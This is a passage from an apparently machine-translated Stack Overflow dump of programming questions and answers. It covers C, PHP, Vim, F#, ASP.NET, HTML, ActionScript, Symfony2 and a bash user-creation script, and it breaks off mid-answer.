## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T08:57:47.490

也许您想考虑使用 PMD 或 FindBugs 等插件来提高代码质量。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-29T10:14:58.160

[CheckStyle](http://checkstyle.sourceforge.net)可以检查代码中的样式问题，例如太长的方法（授予 [MethodLength](http://checkstyle.sourceforge.net/config_sizes.html#MethodLength)）。有一个[Eclipse 插件](http://eclipse-cs.sourceforge.net/)，您可以在其中配置要执行哪些检查、您的限制是什么（例如，将方法报告为“太长”的行数）以及如何显示检查失败（例如，作为错误，作为警告，...）。

# c - unexpected *, unexpected (

> ID：13061947
> 
> 赞同：0
> 
> 时间：2012-10-25T05:10:08.043
> 
> 标签：c, oop, header-files, netbeans-7

I'm trying to following to application in [OOP C](http://www.cs.rit.edu/~ats/books/ooc.pdf) but I get errors in my new.h file.

I am getting a bunch of "unexpected" errors. Just about everything after the first 'void' is exepected. Any ideas?

```
#ifndef NEW_H
#define NEW_H

#ifdef  __cplusplus
extern "C" {
#endif

void * new (const void * type);
void delete (void * item);  

#ifdef  __cplusplus
}
#endif

#endif  /* NEW_H */ 
```

![enter image description here](../Images/c6362b76a8f7ae18c19580ef21eee31c.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:14:32.513

这似乎是少数在 C++ 下无效的 C 程序之一：标识符在 C`new`下`delete`完全有效，但在 C++ 下被保留。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T05:14:20.090

new 和 delete 是 C++ 中的关键字，而不是合法的函数名。

即使您认为您正在编译 C，也请测试它是否可以修复它。如果没有，那可能是经典的 C/C++ 神秘错误：问题出在*前面*的 include 中，可能是缺少分号什么的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T05:12:28.487

好吧，您正在编译为 C，但`new`and`delete`运算符仅在 C++ 中受支持。

`new`此外，和的签名`delete`是：

```
void* operator new(size_t n);
void operator delete(void* p); 
```

您还可以为特定类重载这些运算符（通过在类中声明它们）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T05:45:07.363

如果你想模拟 in 的功能，`new`那么`C`你`C++`实际上得到了错误的参数`new`。应该是`const unsigned int`或者`const size_t` 因为 new 在 C++ 中被用作

```
int *p;
p=new (sizeof(int)); 
```

但是这里的类型不匹配无法转换`int`为`const void *`

因为`delete`这很好，因为`delete`作为`pointer`论据

# php - How to treat string as a string and not as an int in PHP

> ID：13061948
> 
> 赞同：5
> 
> 时间：2012-10-25T05:10:15.447
> 
> 标签：php, type-conversion

I was reading PHP manual and I came across [type juggling](http://php.net/manual/en/language.types.type-juggling.php)

I was confused, because I've never came across such thing.

```
$foo = 5 + "10 Little Piggies"; // $foo is integer (15) 
```

When I used this code it returns me 15, it adds up 10 + 5 and when I use `is_int()` it returns me true ie. `1` where I was expecting an error, it later referenced me to `String conversion to numbers` where I read `If the string starts with valid numeric data, this will be the value used. Otherwise, the value will be 0 (zero)`

```
$foo = 1 + "bob3";             /* $foo is int though this doesn't add up 3+1 
                                  but as stated this adds 1+0 */ 
```

now what should I do if I want to treat 10 Little Piggies OR bob3 as a `string` and not as an `int`. Using `settype()` doesn't work either. I want an error that I cannot add 5 to a string.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T05:15:02.887

如果你想要一个错误，你需要触发一个错误：

```
$string = "bob3";
if (is_string($string)) 
{
    trigger_error('Does not work on a string.');
}
$foo = 1 + $string; 
```

或者如果你喜欢有一些界面：

```
class IntegerAddition
{
    private $a, $b;
    public function __construct($a, $b) {
        if (!is_int($a)) throw new InvalidArgumentException('$a needs to be integer');
        if (!is_int($b)) throw new InvalidArgumentException('$b needs to be integer');
        $this->a = $a; $this->b = $b;
    }
    public function calculate() {
        return $this->a + $this->b;
    }
}

$add = new IntegerAddition(1, 'bob3');
echo $add->calculate(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T05:24:23.943

这是由于 PHP 的动态类型特性而设计的，当然也没有明确的类型声明要求。变量类型是根据上下文确定的。

根据您的示例，当您这样做时：

```
$a = 10;
$b = "10 Pigs";

$c = $a + $b // $c == (int) 20; 
```

调用`is_int($c)`当然总是会评估为布尔值 true，因为 PHP 已决定将语句的结果转换为整数。

如果你正在寻找解释器的错误，你不会得到它，因为就像我提到的那样，这是语言中内置的东西。您可能必须编写很多丑陋的条件代码来测试您的数据类型。

或者，如果您想这样做以测试传递给您的函数的参数 - 这是我能想到的唯一场景，您可能想要这样做 - 您可以相信调用您的函数的客户端知道他们在做什么。否则，返回值可以简单地记录为未定义。

我知道来自其他平台和语言，这可能很难接受，但信不信由你，很多用 PHP 编写的优秀库都遵循相同的方法。

# vim - How to select a jagged block in Vim?

> ID：13061950
> 
> 赞同：4
> 
> 时间：2012-10-25T05:10:29.027
> 
> 标签：vim

For example, there are some text like this:

```
001 aaaaa
002 bbbbbbbb
003 ccc 
```

I want to select

```
aaaaa
bbbbbbbb
ccc 
```

and yank it. What should I do?

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T05:19:57.193

**以下序列应该可以解决问题**

```
ggw<C-v>G$ 
```

**在哪里**

```
gg    -- Goes to top of file
w     -- skips one word
<C-v> -- starts visual block select
G     -- selects until end of file
$     -- selects to end of each line 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T05:23:45.013

`Visual Mode`按`v`提示切换到Vim

把它`cursor`放在`column``select`

用于`ctrl+v`选择要复制的块

然后将单独选择该列并单独复制所需的文本并可以拉出它:)

[请参考这里的链接](http://sethmason.com/2007/09/27/vim-tip-select-column.html)

# f# - How do you provide ResizeArray to legacy F# apps?

> ID：13061952
> 
> 赞同：3
> 
> 时间：2012-10-25T05:10:32.700
> 
> 标签：f#, mono

I'm building TrueSkill, the F# app, from 2008, on Mono 3.0 with F# 3.0\. The two errors I get are

`fList |> ResizeArray.iter (fun f -> f.ResetMarginals())` and

`let sumLogS = fList |> ResizeArray.fold_left (fun acc f -> acc + (f.LogNormalisation ())) 0.0`.

For F# 1.9, `ResizeArray` came from the PowerPack. Apparently there's a PowerPack on github now. But the standard Mono docs show that `ResizeArray<T>` is just an alias for `List<T>`. Do I need to get the original `ResizeArray`, and if so, how would I do just that from the PowerPack, using the `ResizeArray.fs`? What's the current relationship between `List` and `ResizeArray`?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T06:25:14.957

澄清一下，[ResizeArray<'T>](http://msdn.microsoft.com/en-us/library/ee353447.aspx)也是`List<'T>`.NET 中的别名。`ResizeArray`F# PowerPack 仅提供模块中的高阶函数。

[因为对这个模块](https://github.com/fsharp/powerpack/blob/master/src/FSharp.PowerPack/ResizeArray.fs)没有依赖，所以建议直接将*ResizeArray.fs*复制到你的项目中。您可能必须更改一些函数名称以匹配新`ResizeArray`模块，例如更改`fold_left`为`fold`和。`fold_right``foldBack`

# asp.net - How to post and access the data using jquery ajax in asp.net webforms?

> ID：13061959
> 
> 赞同：1
> 
> 时间：2012-10-25T05:11:02.863
> 
> 标签：asp.net, jquery

Here is my current code:

Here is for default.aspx

```
<body>
    <form id="form1" runat="server">
    <div id="mydiv">

    </div>
    </form>
    <script>
        $(document).ready(function () {

            $.ajax({
                url: 'Default2.aspx',
                data: "{ 'name': '" + "randel" + "' }",

                type: "POST",
                success: function () {

                    // alert('insert was performed.');
                    $("#mydiv").empty();

                    $("#mydiv").load("Default2.aspx #div");

                },
                error: function (data, status, jqXHR) { alert(jqXHR); }
            });

        })
    </script>
</body> 
```

Then for Default2.aspx, I want to access the data like this:

```
protected void Page_Load(object sender, EventArgs e)
    {
        Label1.Text = Request.Form["name"].ToString();

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:19:46.963

这看起来像您想在 ASP.NET中使用**WebMethod ：**

```
$(document).ready(function () {
            $.ajax({
                url: 'Default2.aspx/HelloWorld',
                data: "{ 'name': '" + "randel" + "' }",
                type: "POST",
                contentType: "application/json; charset=utf-8",
                dataType: "json",
                success: function (data) {
                    // alert('insert was performed.');
                    $("#mydiv").empty();
                    $("#mydiv").html(data);
                },
                error: function (data, status, jqXHR) { alert(jqXHR); }
            });
        }); 
```

在你后面的代码中你应该这样做：

```
[WebMethod()]
public static string HelloWorld(string name)
{
string message = "Hello " + name;
return message;
} 
```

WebMethods 在某种程度上比执行**__doPostBack()**更好，因为您使用例如 jQuery 控制所有客户端-服务器流量。有关 WebMethods 的更多信息：[这里](http://elegantcode.com/2009/02/21/javascript-arrays-via-jquery-ajax-to-an-aspnet-webmethod/)或只是谷歌 WebMethods ASP.NET。

如果你想接收一些表单值，你应该把它放在**$.ajax 数据**参数上，并在**WebMethod**中添加相同的参数。

**已编辑**

从您发布的代码中，我看到您希望将一些数据从 Default.aspx 发送到 Default2.aspx 并从 Default2.aspx (#div) 加载一些内容。

你可以这样做：

```
$.ajax({
                url: "/Default2.aspx",
                type: "GET",
                dataType: "html",
                async: false,
                data: { "name": "randel"
                },
                success: function (obj) {
                    // obj will contain the complete contents of the page requested
                    // use jquery to extract just the html inside the body tag
                    $content = $(obj).find('body #div').html();
                    // then update the dialog contents with this and show it
                }
         }); 
```

在后面的代码中：

```
protected void Page_Load(object sender, EventArgs e)
    {
        Label1.Text = Request.QueryString["name"];
    } 
```

# html - 编辑器为 HTML 文件提供“意外的结束标记”语法错误

> ID：13061960
> 
> 赞同：0
> 
> 时间：2012-10-25T05:11:11.233
> 
> 标签：html, editor, syntax-error, komodoedit

编辑：由于项目的时间限制，我只需要恢复到代码的工作副本并重做我所有的工作，但我仍然想知道未来的原因是什么。

所以，我现在遇到这个问题已经有一段时间了，我一直在研究这个 HTML 文件中的一个 dags，我的编辑器（Komodo）会在哪里加下划线“意外的结束标签（忽略）。这并没有造成太大的问题，所以我只是忽略了它......直到编辑器开始用同样的东西突出显示结束的正文标签，并且文件实际上不能正常工作（使用 JQM）了.

我不明白的是我根本没有接触过 HTML。在过去发生这种情况时（就像以前一样），我只是从我正在使用的 repo 中提取了一个以前的版本，这将解决问题，但是这次我有一段时间没有提交了，我真的想要找到解决此问题的方法，而不是快速修复。

这是我通过编辑器收到的语法错误的屏幕截图：

![在此处输入图像描述](../Images/edc0fb0d7264d410a35eed25f8562393.png)

如果重要的话，这是表单的 HTML：

```
 <div data-role="content">
                        <img src="img/logo.png" alt="RPG Tracker">
        <form action="" method="post" id="addCharForm">
            <fieldset data-role="controlgroup">
                <label for="dateCreated">Date Created:</label>
            <input type="date" name="dateCreated" id="dateCreated">
        </fieldset>

        <fieldset data-role="controlgroup">
                <label for="charAge">Age:</label>
            <input type="text" name="charAge" id="charAge" value="" class="required number">
        </fieldset>

        <fieldset data-role="controlgroup">
            <label for="charName">Name:</label>
            <input type="text" name="charName" id="charName" value="" class="required">
        </fieldset>

        <fieldset data-role="controlgroup" data-type="horizontal">
            <legend>Choose character gender:</legend>
            <input type="radio" name="gender" id="radioMale" value="Male">
            <label for="radioMale">Male</label>

            <input type="radio" name="gender" id="radioFemale" value="Female">
            <label for="radioFemale">Female</label>
        </fieldset>

        <fieldset data-role="controlgroup">
            <label for="charAttrs">Describe your character's <b>attributes</b> in this field:</label>
            <textarea id="charAttrs" name="charAtts"></textarea>
        </fieldset>
        <fieldset data-role="controlgroup">
            <label for="charSkills">Describe your character's <b>skills</b> in this field:</label>
            <textarea id="charSkills" name="charSkills"></textarea>
        </fieldset>
        <fieldset data-role="controlgroup">
            <label for="charBio">Character Biography:</label>
            <textarea id="charBio" name="charBio"></textarea>
        </fieldset>
        <fieldset data-role="controlgroup">
            <label for="charRating">Rate Your Character:</label>
            <input type="range" name="charRating" id="charRating" value="100" min="0" max="100">
        </fieldset>

        <input type="reset" value="Reset">
        <input type="submit" value="Submit Character" data-theme="b">
        </form>
    </div> 
```

根据要求，这是完整的 html： http: [//pastebin.com/tsE0MuP7](http://pastebin.com/tsE0MuP7)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T10:31:08.430

`input`和`img`标签是自动关闭的，所以我建议将它们全部关闭并查看是否可以修复它。（我怀疑它不会，但值得一试）。

例如

```
<img src="img/logo.png" alt="RPG Tracker" /> 
```

和

```
<input type="date" name="dateCreated" id="dateCreated" /> 
```

问题也可能在文件的其他地方，因此最好使用整个 HTML 的副本。它可能是某处的开放标签（例如，使用`<div>`而不是`</div>`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-11-27T17:33:47.177

```
 <fieldset data-role="controlgroup">
        <label for="charName">Name:</label>
        <input type="text" name="charName" id="charName" value="" class="required">
    </fieldset>

    <fieldset data-role="controlgroup" data-type="horizontal">
        <legend>Choose character gender:</legend>
        <input type="radio" name="gender" id="radioMale" value="Male">
        <label for="radioMale">Male</label>

        <input type="radio" name="gender" id="radioFemale" value="Female">
        <label for="radioFemale">Female</label>
    </fieldset>

    <fieldset data-role="controlgroup">
        <label for="charAttrs">Describe your character's <b>attributes</b> in this field:</label>
        <textarea id="charAttrs" name="charAtts"></textarea>
    </fieldset>
    <fieldset data-role="controlgroup">
        <label for="charSkills">Describe your character's <b>skills</b> in this field:</label>
        <textarea id="charSkills" name="charSkills"></textarea>
    </fieldset>
    <fieldset data-role="controlgroup">
        <label for="charBio">Character Biography:</label>
        <textarea id="charBio" name="charBio"></textarea>
    </fieldset>
    <fieldset data-role="controlgroup">
        <label for="charRating">Rate Your Character:</label>
        <input type="range" name="charRating" id="charRating" value="100" min="0" max="100">
    </fieldset>

    <input type="reset" value="Reset">
    <input type="submit" value="Submit Character" data-theme="b">
    </form>
</div> 
```

# actionscript-3 - 检查孩子是否存在 as3

> ID：13061964
> 
> 赞同：1
> 
> 时间：2012-10-25T05:11:25.570
> 
> 标签：actionscript-3

我想检查一个孩子是否存在，如果它确实删除了它。如果不做其他事情......我还计划为更多的孩子做检查......

```
stage.addEventListener(KeyboardEvent.KEY_DOWN, onKeyDown3);

function onKeyDown3(event:KeyboardEvent):void
{
    if( event.keyCode == Keyboard.BACK )
    {
        if (over.stage){
        event.preventDefault();
        removeChild(over);
        gotoAndPlay(350, "Scene 1");
        }else {
        event.preventDefault();
        gotoAndPlay(346, "Scene 1");        
        }

    }
} 
```

我试过了，但它不起作用。但我认为它基本上显示了我想做的事情，但如果是为了其他孩子的话，还有更多其他事情。“结束”只是一个电影剪辑

错误：

```
TypeError: Error #2007: Parameter child must be non-null.
    at flash.display::DisplayObjectContainer/setChildIndex()
    at Bike_safety_fla::MainTimeline/onKeyDown1()[Bike_safety_fla.MainTimeline::frame146:17]
    at runtime::ContentPlayer/sendKeyUpDown()
    at runtime::SimulatedMobileDeviceContentPlayer/onBack() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T05:28:48.897

Use [contains()](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/DisplayObjectContainer.html#contains%28%29) to test if `over` is on the display list.

From DisplayObjectContainer documentation:

> Determines whether the specified display object is a child of the DisplayObjectContainer instance or the instance itself. The search includes the entire display list including this DisplayObjectContainer instance. Grandchildren, great-grandchildren, and so on each return true.

Implemented as:

```
if (this.contains(over))
{
    removeChild(over);
    gotoAndPlay(350, "Scene 1");
}
else
{
    gotoAndPlay(346, "Scene 1");        
} 
```

# symfony - Symfony2 框架中的多个项目

> ID：13061966
> 
> 赞同：1
> 
> 时间：2012-10-25T05:11:53.190
> 
> 标签：symfony

Symfony2 框架是一个捆绑包。第三方的任何附加功能也是捆绑的。所以，每个 Symfony2 项目都需要 bundle，而且碰巧有几个项目会使用来自第三方的一些类似的 bundle。

为了解释我的问题，我做了这个例子。我在“sf2”文件夹中有一个 Symfony2 框架。我有 3 个网站项目，我决定使用 Symfony2 框架来构建它们。在我目前的情况下，我将“sf2”文件夹复制到另外 3 个文件夹中：sf2-web1、sf2-web2、sf2-web3。在每个 sf2* 文件夹中，可能使用了一些类似的包。

问题是，是否可以仅在一个 Symfony2 框架文件夹中开发 3 个项目？怎么做？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-25T09:05:44.377

是的，有可能。在您的情况下，我将使用下一个目录结构：

```
/projects
    1stProject
        app         
        src         
        web
        ..
    2ndProject
        app
        src
        web
        ...
    ..
    vendor          <- Core and third-party bundles 
```

每个项目都使用相同的供应商、symfony 版本和第三方包。

如果您需要分离这些项目之一，只需将供应商文件夹复制到项目文件夹并在 autoload.php 中更改供应商的路径

# bash - 新用户创建脚本错误

> ID：13061975
> 
> 赞同：1
> 
> 时间：2012-10-25T05:12:45.193
> 
> 标签：bash, ubuntu

我有下面列出的脚本，我似乎无法解决这个问题。我正在尝试为我所在的 UNIX 类制作一个交互式登录脚本。我基本上是在构建一个命令以传递到`useradd`. 我在传递到命令行时发出的命令（在添加时`sudo`）按预期工作，但是当我尝试从我的脚本运行它时（它正在生成我复制/粘贴到命令行中的文本）它给了我一些错误...在这一点上，我不知道接下来要尝试什么来解决这个问题。

**错误：**

```
useradd -m --user-group jaredm2 #command that is attempting to run...
useradd: invalid option -- ' '
Usage: useradd [options] LOGIN
....rest of useradd error text.... 
```

**脚本：**

```
#!/bin/bash
#Add a new user

FINALCOMMAND="-m"

#import useradd defaults...
. /etc/default/useradd

#Check if running as root
if [ "$(id -u)" != "0" ]; then
    echo "This script must be ran as root"
    exit 1
fi

#Get the new users Name
#echo -n "Please enter the users First and Last Name and press [ENTER]: "
#read Name

#Get the new users username
echo "The username must be 4-20 characters."
echo -n "Please enter the users requested username and press [ENTER]: "
read USERNAME
while [ $(grep -c "^${USERNAME}:" /etc/passwd) -ge 1 ] || [ ${#USERNAME} -le 3 ] || [ ${#USERNAME} -ge 21 ]
do
    echo " "
    echo "Error: Username is in use or invalid.  Please select a different username."
    echo " "
    echo -n "Please enter the users requested username and press [ENTER]: "
    read USERNAME   
done #USERNAME will be valid from this point

#ASK about the default shell now
echo -n "Enter the new shell if you would like one (currently $SHELL) or leave blank for the default and press [ENTER]: "
read tempSHELL
if [ ${#tempSHELL} -ge 1 ]; then
    SHELL="$tempSHELL"
    FINALCOMMAND="$FINALCOMMAND ""-s $SHELL"
fi

#ASK about a different primary group
echo "Would you like to enter a non-default primary user group? Defaults to creating a new group that matches the username"
echo "Enter a new Primary Group or leave blank for the default and press [ENTER]: "
read newPrimaryGroup

if [ ${#newPrimaryGroup} -eq 0 ]; then
    FINALCOMMAND="$FINALCOMMAND --user-group"
else
    if [ $(grep -c "^${newPrimaryGroup}" /etc/group) -ge 1 ]; then
        FINALCOMMAND="$FINALCOMMAND -g $newPrimaryGroup"
    else
        echo "Invalid group specified reverting to default!"
        FINALCOMMAND="$FINALCOMMAND --user-group"
    fi
fi
useradd -m --user-group jaredm2
#ASK about additional groups
echo "Would you like the new user to be a part of any additional groups?  Leave blank if no additional groups are needed or enter additional groups in the format of GROUP1,GROUP2,... (NO SPACES) and press [ENTER]: "
read extraGroups
#remove spaces if the user entered any
extraGroups="${extraGroups//[[:space:]]}"
FINALEXTRAGROUPS=""
IFS=","
for g in $extraGroups
do
    if [ $(grep -c "^${g}" /etc/group) -ge 1 ]; then
        FINALEXTRAGROUPS="$FINALEXTRAGROUPS,$g"
    else
        echo "$g is invalid user will not be added..."
    fi
done
FINALEXTRAGROUPS=$(echo "$FINALEXTRAGROUPS" | tail -c +2)
if [ ${#FINALEXTRAGROUPS} -ge 1 ]; then
    FINALCOMMAND="$FINALCOMMAND -G $FINALEXTRAGROUPS"
fi

#ASK about the home directory
echo "Would you like to enter a new home directory for the user?  Leave blank to use the default of $HOME/$USERNAME or enter your own and press [ENTER]: "
read NEWHOME

if [ ${#NEWHOME} -ge 1 ]; then
    FINALCOMMAND="$FINALCOMMAND -d $NEWHOME"
fi

#ADD the username to the command
FINALCOMMAND=`echo "$FINALCOMMAND $USERNAME" | sed 's/ *$//g' | sed 's/^ *//g'`
echo "useradd $FINALCOMMAND"
#PASSCOMMAND="sudo passwd $USERNAME"
#ADD THE USER
`useradd $FINALCOMMAND`

`passwd $USERNAME`

`chfn $USERNAME` 
```

**更新：添加调试内容**

```
+ '[' 0 -ge 1 ']'
++ sed 's/^ *//g'
++ sed 's/ *$//g'
++ echo '/usr/sbin/useradd -m -U JaredM'
+ FINALCOMMAND='/usr/sbin/useradd -m -U JaredM'
++ '/usr/sbin/useradd -m -U JaredM'
./addnewuser.sh: line 89: /usr/sbin/useradd -m -U JaredM: No such file or directory 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T06:22:39.390

如果`man -s8 useradd`未提及`--user-group`可用的选项，`-U`则将不起作用。还有另一个值得尝试的解决方案：

> 默认行为（如果未指定 -g、-N 和 -U 选项）由 /etc/login.defs 中的 USERGROUPS_ENAB 变量定义。

另一种方法是，您必须将`useradd`命令与`groupadd`具有相同用户名的命令链接起来，作为两个命令的参数。

**编辑：** 这必须有效。首先创建组，然后创建用户并将这个新用户添加到组中。因为，您是在脚本中执行此操作的，所以应该可以很好地完成这项工作。

做这个：

```
groupadd jaredm2
useradd -m -g jaredm2 jaredm2 
```

而不是这个：

```
useradd -m --user-group jaredm2 
```

请注意，某些已安装在您的操作系统中的其他程序可能已经更改了您的二进制文件或对其的访问权限，甚至为它创建了别名。您的`which`输出表明它链接到`useradd`bin 目录中的二进制文件，正是它应该在的位置。

所以我猜：

*   二进制文件可能已被进程、软件包安装程序或其他东西更改或替换
*   二进制版本和手册页版本之间存在一些不匹配（很可能是您在某个时间点不正确地升级了操作系统）

我认为，唯一的解决方案是使用上述命令对或`useradd`手动更改您正在使用的二进制文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-30T13:40:46.117

问题是由您的脚本引起的，您使用魔术引号``...``来执行您的 shell 命令。

仅当您要将命令的返回存储在变量中时才应使用这些引号：例如以下指令：

```
FINALCOMMAND=`echo "$FINALCOMMAND $USERNAME" | sed 's/ *$//g' | sed 's/^ *//g'` 
```

否则没有必要使用这个引用，它们会产生像你这样的错误。

你可以把你的脚本：

```
useradd $FINALCOMMAND
passwd $USERNAME
chfn $USERNAME 
```

代替：

```
`useradd $FINALCOMMAND`
`passwd $USERNAME`
`chfn $USERNAME` 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-03T17:10:00.780

通过使用数组，您可以防止命令行中出现与 IFS 相关的错误，并且更加简洁。这个已经测试过了。我也对代码进行了一些清理。

```
#!/bin/bash

#Add a new user

FINALCOMMAND=("-m")

#Import useradd defaults...
. /etc/default/useradd

#Check if running as root
if [ "$(id -u)" != "0" ]; then
    echo "This script must be ran as root"
    exit 1
fi

#Get the new users Name
#echo -n "Please enter the users First and Last Name and press [ENTER]: "
#read Name

#Get the new users username
echo "The username must be 4-20 characters."
echo -n "Please enter the users requested username and press [ENTER]: "
read USERNAME
while [ $(grep -c "^${USERNAME}:" /etc/passwd) -ge 1 ] || [ ${#USERNAME} -le 3 ] || [ ${#USERNAME} -ge 21 ]; do
    echo " "
    echo "Error: Username is in use or invalid.  Please select a different username."
    echo " "
    echo -n "Please enter the users requested username and press [ENTER]: "
    read USERNAME
done #USERNAME will be valid from this point

#ASK about the default shell now
echo -n "Enter the new shell if you would like one (currently $SHELL) or leave blank for the default and press [ENTER]: "
read tempSHELL
if [ ${#tempSHELL} -ge 1 ]; then
    SHELL="$tempSHELL"
    FINALCOMMAND=("${FINALCOMMAND[@]}" "-s" "$SHELL")
fi

#ASK about a different primary group
echo "Would you like to enter a non-default primary user group? Defaults to creating a new group that matches the username"
echo -n "Enter a new Primary Group or leave blank for the default and press [ENTER]: "
read newPrimaryGroup

if [ ${#newPrimaryGroup} -eq 0 ]; then
    FINALCOMMAND=("${FINALCOMMAND[@]}" "--user-group")
else
    if [ $(grep -c "^${newPrimaryGroup}" /etc/group) -ge 1 ]; then
        FINALCOMMAND=("${FINALCOMMAND[@]}" "-g" "$newPrimaryGroup")
    else
        echo "Invalid group specified reverting to default!"
        FINALCOMMAND=("${FINALCOMMAND[@]}" "--user-group")
    fi
fi

#ASK about additional groups
echo -n "Would you like the new user to be a part of any additional groups?  Leave blank if no additional groups are needed or enter additional groups in the format of GROUP1,GROUP2,... (NO SPACES) and press [ENTER]: "
read extraGroups
#remove spaces if the user entered any
extraGroups="${extraGroups//[[:space:]]}"
FINALEXTRAGROUPS=''
IFS=, read -a TEMP <<< "$extraGroups"
for g in "${TEMP[@]}"; do
    if [ $(grep -c "^${g}" /etc/group) -ge 1 ]; then
        FINALEXTRAGROUPS="$FINALEXTRAGROUPS,$g"
    else
        echo "$g is invalid user will not be added..."
    fi
done

if [ ${#FINALEXTRAGROUPS[@]} -ge 1 ]; then
    FINALCOMMAND=("${FINALCOMMAND[@]}" "-G" "${FINALEXTRAGROUPS:1}")
fi

#ASK about the home directory
echo -n "Would you like to enter a new home directory for the user?  Leave blank to use the default of $HOME/$USERNAME or enter your own and press [ENTER]: "
read NEWHOME

if [ ${#NEWHOME} -ge 1 ]; then
    FINALCOMMAND=("${FINALCOMMAND[@]}" "-d" "$NEWHOME")
fi

#ADD the username to the command
FINALCOMMAND=("${FINALCOMMAND[@]}" "$USERNAME")

#PASSCOMMAND="sudo passwd $USERNAME"

#ADD THE USER
echo "useradd ${FINALCOMMAND[@]}"

useradd "${FINALCOMMAND[@]}"

passwd "$USERNAME"

chfn "$USERNAME" 
```

注意：在较新版本的 bash 中，您可以使用 += 将值附加到数组中，例如 ARRAY+=("value")

另外根据我的其他偏好，我会以这种方式进一步改进代码，但这还不是最好的：

```
#!/bin/bash

shopt -s extglob

# Check if running as root.
if [[ "$(id -u)" != 0 ]]; then
    echo "This script must be ran as root."
    exit 1
fi

# Initialize useradd command variable.
USERADDCOMMAND=("useradd" "-m")

# Import useradd defaults.
. /etc/default/useradd

# Get the new user's name.
#echo -n "Please enter the users First and Last Name and press [ENTER]: "
#read NAME

# Get the new users username.
echo "The username must be 4-20 characters."
while :; do
    read -p "Please enter the user's requested username and press [ENTER]: " USERNAME
    [[ ${#USERNAME} -ge 4 && ${#USERNAME} -le 20 && $USERNAME == +([[:alpha:]])*([[:alnum:]_-]) ]] || {
        echo "Error: Username is invalid. Please enter a different username."
        continue
    }
    [[ $(grep -c "^${USERNAME}:" /etc/passwd) -ge 1 ]] && {
        echo "Error: Username is in use. Please enter a different username."
        continue
    }
    break
done

# Ask about the default shell.
read -p "Enter the new shell if you would like one (currently $SHELL) or leave blank for the default and press [ENTER]: " SHELL_
if [[ ${#SHELL_} -ge 1 ]]; then
    USERADDCOMMAND=("${USERADDCOMMAND[@]}" "-s" "$SHELL_")
else
    # We use this if we really are to use SHELL specified in $SHELL but it still needs further workarounds like checking if $SHELL is valid. Those could be easily done but it depends if this one's really necessary.
    #USERADDCOMMAND=("${USERADDCOMMAND[@]}" "-s" "$SHELL")
    :
fi

# Ask about a different primary group.
echo "Would you like to enter a non-default primary user group? Defaults to creating a new group that matches the username."
echo -n "Enter a new Primary Group or leave blank for the default and press [ENTER]: "
read NEWPRIMARYGROUP

if [[ ${#NEWPRIMARYGROUP} -eq 0 ]]; then
    USERADDCOMMAND=("${USERADDCOMMAND[@]}" "--user-group")
else
    if [[ $(grep -c "^${NEWPRIMARYGROUP}" /etc/group) -ge 1 ]]; then
        USERADDCOMMAND=("${USERADDCOMMAND[@]}" "-g" "$NEWPRIMARYGROUP")
    else
        echo "Invalid group specified reverting to default!"
        USERADDCOMMAND=("${USERADDCOMMAND[@]}" "--user-group")
    fi
fi

# Ask about additional groups.
echo -n "Would you like the new user to be a part of any additional groups?  Leave blank if no additional groups are needed or enter additional groups in the format of GROUP1,GROUP2,... (NO SPACES) and press [ENTER]: "
read EXTRAGROUPS
# Remove spaces if the user entered any.
EXTRAGROUPS="${EXTRAGROUPS//[[:space:]]}"
FINALEXTRAGROUPS=''
IFS=, read -a TEMP <<< "$EXTRAGROUPS"
for G in "${TEMP[@]}"; do
    if [[ $(grep -c "^${g}" /etc/group) -ge 1 ]]; then
        FINALEXTRAGROUPS="$FINALEXTRAGROUPS,$G"
    else
        echo "$G is an invalid user and will not be added."
    fi
done
if [[ ${#FINALEXTRAGROUPS[@]} -ge 1 ]]; then
    USERADDCOMMAND=("${USERADDCOMMAND[@]}" "-G" "${FINALEXTRAGROUPS:1}")
fi

# Ask about the home directory
read -p "Would you like to enter a new home directory for the user?  Leave blank to use the default of $HOME/$USERNAME or enter your own and press [ENTER]: " NEWHOME
if [[ ${#NEWHOME} -ge 1 ]]; then
    USERADDCOMMAND=("${USERADDCOMMAND[@]}" "-d" "$NEWHOME")
fi

# Add the username to the command
USERADDCOMMAND=("${USERADDCOMMAND[@]}" "$USERNAME")

# Add THE USER
echo "> ${USERADDCOMMAND[*]}"
"${USERADDCOMMAND[@]}"

echo "> passwd $USERNAME"
passwd "$USERNAME"

echo "> chfn $USERNAME"
chfn "$USERNAME"  # -f "$NAME" 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-30T13:00:14.873

从您对调试内容的更新来看，您所做的似乎与您发布的脚本不同。

无论如何，从调试输出中，我怀疑您正在尝试使用双引号运行 adduser 命令

```
"$FINALCOMMAND" 
```

或者也可能包含在反引号中，因为这似乎是触发“没有这样的文件或目录”错误消息的唯一情况。

摆脱双引号应该可以解决问题。

**p/s**：除非您实际使用输出（例如用于测试或分配给变量），否则不要使用命令替换（````），否则可能会发生类似的事情

```
$ `echo Just saying hi`
Just: command not found 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-02T15:14:16.100

我修复了您脚本中的错误，只需删除 IFS=","

这是对环境变量 IFS（内部字段分隔符）的误用

脚本变为：

```
#!/bin/bash
#Add a new user

FINALCOMMAND="-m"

#import useradd defaults...
. /etc/default/useradd

#Check if running as root
if [ "$(id -u)" != "0" ]; then
